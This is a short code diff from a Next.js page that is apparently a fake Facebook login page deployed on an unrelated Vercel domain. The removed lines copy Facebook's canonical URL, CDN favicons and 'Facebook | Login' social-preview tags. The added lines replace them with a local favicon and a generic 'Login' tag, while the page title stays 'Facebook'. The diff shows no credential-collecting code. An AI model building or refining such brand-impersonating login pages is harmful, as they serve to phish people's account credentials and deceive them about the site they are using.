@@ -34,32 +34,9 @@ export default function Home() {
 			<Head>
 				<title>Facebook</title>
 				<meta name="viewport" content="width=device-width, initial-scale=1" />
-				<link rel="canonical" href="https://web.facebook.com/" />
-				<link
-					rel="shortcut icon"
-					href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
-				/>
-				<link
-					rel="icon"
-					href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
-				/>
-				<meta name="og:title" content="Facebook" />
-				<meta name="twitter:card" content="summary_large_image" />
-				<meta name="twitter:site" content="" />
-				<meta property="twitter:image:height" content="640" />
-				<meta property="twitter:image:width" content="1200" />
-				<meta property="og:image:height" content="640" />
-				<meta property="og:image:width" content="1200" />
-				<meta name="twitter:title" content="Facebook | Login" />
-				<meta name="twitter:description" content="Log in Facebook" />
-				<meta name="description" content="Log in Facebook" />
-				<meta name="title" content="Facebook | Login" />
-				<meta property="og:site_name" content="Facebook" />
-				<meta property="og:locale" content="en_US" />
-				<meta property="og:title" content="Facebook | Login" />
-				<meta property="og:description" content="Log in Facebook" />
-				<meta property="og:type" content="website" />
-				<meta property="og:url" content="https://hollisterco.vercel.app/" />
+				<link rel="shortcut icon" href="./favicon.ico" />
+				<link rel="icon" href="./favicon.ico" />
+				<meta name="og:title" content="Login" />
 			</Head>
 			<main className="flex min-h-[95vh] flex-col items-center justify-between sm:px-24">
 				<section className="container xl:px-32 px-5 py-36 mx-auto flex flex-wrap items-center">
